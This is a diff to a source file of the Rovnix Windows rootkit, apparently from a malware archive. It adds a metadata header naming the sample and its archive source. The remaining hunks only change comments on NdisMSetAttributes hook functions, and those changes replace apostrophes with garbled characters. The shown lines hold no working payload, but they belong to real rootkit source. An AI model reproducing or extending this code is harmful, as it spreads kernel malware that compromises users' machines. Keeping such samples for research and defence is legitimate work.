@@ -1,3 +1,14 @@
+/*
+  name      Rovnix
+  type      rootkit
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 // KIP (NT-kernel TCP/IP implementation library)
 //	
@@ -2769,7 +2780,7 @@ VOID
 // Description: 
 //		NdisMSetAttributes hook.
 //		NdisMSetAttributes informs the NDIS library about significant features of 
-//		the caller’s NIC during initialization. 
+//		the callerï¿½s NIC during initialization. 
 //
 // Return value: 
 //		None
@@ -2780,7 +2791,7 @@ VOID
 //		MiniportAdapterContext 
 //			Specifies a handle for a resident context area allocated by MiniportInitialize. 
 //		BusMaster 
-//			Specifies TRUE if the caller’s NIC is a bus-master DMA device. 
+//			Specifies TRUE if the callerï¿½s NIC is a bus-master DMA device. 
 //		AdapterType 
 //
 // NOTE: None
@@ -2825,7 +2836,7 @@ VOID
 // Description: 
 //		NdisMSetAttributesEx hook.
 //		NdisMSetAttributesEx informs the NDIS library about significant features of 
-//		the caller’s NIC during initialization. 
+//		the callerï¿½s NIC during initialization. 
 //
 // Return value: 
 //		None
